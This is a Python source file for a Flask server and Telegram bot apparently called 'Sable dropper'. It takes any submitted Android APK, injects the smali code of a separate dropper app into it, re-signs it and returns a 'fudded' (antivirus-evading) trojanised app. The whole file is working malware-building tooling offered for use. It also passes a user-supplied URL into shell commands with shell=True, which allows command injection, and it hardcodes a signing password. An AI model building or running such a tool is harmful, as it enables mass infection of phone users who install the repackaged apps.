import os
import logging
import requests
import subprocess
from flask import Flask, request, send_file, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ---------- FLASK SERVER (For Render API) ----------
app = Flask(__name__)

@app.route("/inject", methods=["POST"])
def inject():
    data = request.json or {}
    file_url = data.get("apk_url")
    if not file_url:
        return jsonify({"error": "apk_url required"}), 400
    
    work_dir = "/tmp"
    target = os.path.join(work_dir, "target.apk")
    subprocess.run(f"wget -q -O {target} '{file_url}'", shell=True)
    
    target_dir = os.path.join(work_dir, "target_dir")
    subprocess.run(f"apktool d -f -o {target_dir} {target}", shell=True)
    
    dropper = os.path.join(work_dir, "dropper_base.apk")
    dropper_dir = os.path.join(work_dir, "dropper_dir")
    subprocess.run(f"apktool d -f -o {dropper_dir} {dropper}", shell=True)
    
    src = os.path.join(dropper_dir, "smali")
    dst = os.path.join(target_dir, "smali")
    if os.path.exists(src):
        subprocess.run(f"cp -r {src}/* {dst}/", shell=True)
        
    unsigned = os.path.join(work_dir, "unsigned.apk")
    subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True)
    
    signed = os.path.join(work_dir, "signed.apk")
    subprocess.run(f"apksigner sign --ks keystore.jks --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {unsigned}", shell=True)
    
    return send_file(signed, as_attachment=True, download_name="injected.apk")

# ---------- TELEGRAM BOT ----------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Sable dropper ready. APK file bhej, main fud karke wapas dunga.")

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".apk"):
        await update.message.reply_text("Ye APK nahi hai baby. Sahi APK file bhej.")
        return

    progress_msg = await update.message.reply_text("⏳ [□□□□□□□□□□] 0%\nFile server ko bheji ja rahi hai...")

    try:
        file = await context.bot.get_file(doc.file_id)
        file_url = file.file_path
        
        await progress_msg.edit_text("⏳ [■■■□□□□□□□] 30%\nServer pe download ho raha hai...")
        await progress_msg.edit_text("⏳ [■■■■■□□□□□] 50%\nAPK fud kar raha hai...")
        
        response = requests.post(RENDER_URL, json={"apk_url": file_url}, timeout=300)

        if response.status_code == 200:
            await progress_msg.edit_text("⏳ [■■■■■■■■□□] 90%\nFile send ho rahi hai...")
            await update.message.reply_document(
                document=response.content,
                filename="Fudded_App.apk",
                caption="✅ [■■■■■■■■■■] 100%\nLe baby, fudded APK ready hai."
            )
            await progress_msg.delete()
        else:
            await progress_msg.edit_text("❌ Error! Server ne APK return nahi ki.")
    except Exception as e:
        await progress_msg.edit_text(f"❌ Error aaya: {str(e)}")

def run_bot():
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    print("Bot is running...")
    bot_app.run_polling()

if __name__ == "__main__":
    import threading
    # Bot ko background thread me chalao
    threading.Thread(target=run_bot, daemon=True).start()
    # Flask server ko main thread me chalao (Railway ko iski zaroorat hai)
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
